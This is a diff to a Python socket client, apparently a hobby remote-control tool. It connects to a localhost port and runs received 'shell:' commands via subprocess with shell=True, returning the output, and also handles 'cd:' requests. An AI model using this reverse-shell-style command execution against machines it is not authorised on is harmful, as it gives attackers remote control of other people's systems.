@@ -3,6 +3,8 @@ data = [os.environ['COMPUTERNAME'], platform.system()]
 
 currentDirectory = os.getcwd()
 
+chunkSize = 1
+
 def connect(host, port):
 	notConnected = True
 	while notConnected:
@@ -30,20 +32,23 @@ def checkCommand(data, command):
 
 def send(conn, data):
 	try:
+		print("Sending Data Of Length: " + str(sys.getsizeof(data.encode("utf8"))))
 		conn.send(data.encode("utf8"))
 	except:
 		pass
 port = int(input("Port: "))
+startingDir = os.getcwd()
 while True:
 
 
 	conn = connect('localhost', port)
 
 	active = True
+	currentDirectory = startingDir
 
 	while active:
 		try:
-			data = conn.recv(1024).decode()
+			data = conn.recv(1024 * chunkSize).decode()
 			if data == "":
 				continue
 
@@ -86,11 +91,16 @@ while True:
 				continue
 
 			if checkCommand(data, "cd: ")[0]:
-				args = checkCommand(data, "cd: ")[1]
+				args = os.path.join(currentDirectory,checkCommand(data, "cd: ")[1])
+				print(args)
 				if os.path.isdir(args):
-					print("Changing Directory To: " + args)
-					os.chdir(args)
-					currentDirectory = os.getcwd()
+					try:
+						
+						os.chdir(args)
+						currentDirectory = os.getcwd()
+						print("Changing Directory To: " + currentDirectory)
+					except Exception as e:
+						print("Could not change directory: " + str(e))
 
 			if checkCommand(data, "shell: ")[0]:
 				args = checkCommand(data, "shell: ")[1]
@@ -106,10 +116,10 @@ while True:
 
 				try:
 					output = subprocess.run(args, shell=True, check=True, capture_output=True).stdout.decode()
-					conn.send(output.encode("utf8"))
+					send(conn, output)
 				except Exception as e:
 					print("Error Interpreting Command")
-					conn.send(("Command '" + args + "' Is Invalid: " + str(e)).encode("utf8"))
+					send(conn, "Command '" + args + "' Is Invalid: " + str(e))
 		except Exception as e:
 			print(e)
 			active = False
